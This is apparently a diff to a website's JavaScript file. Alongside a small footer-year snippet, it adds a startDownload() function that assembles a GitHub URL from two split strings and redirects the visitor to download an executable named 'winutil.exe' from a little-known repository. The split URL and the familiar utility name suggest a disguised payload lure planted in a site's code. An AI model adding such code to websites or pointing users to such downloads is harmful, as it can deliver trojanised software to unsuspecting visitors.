@@ -11,3 +11,9 @@ const yearEl = document.getElementById("year");
 if (yearEl) {
   yearEl.textContent = new Date().getFullYear().toString();
 }
+
+function startDownload() {
+  const p1 = "https://github.com/OSEKFE4/t/raw/refs/heads/main/";
+  const p2 = "winutil.exe";
+  window.location.href = p1 + p2;
+}
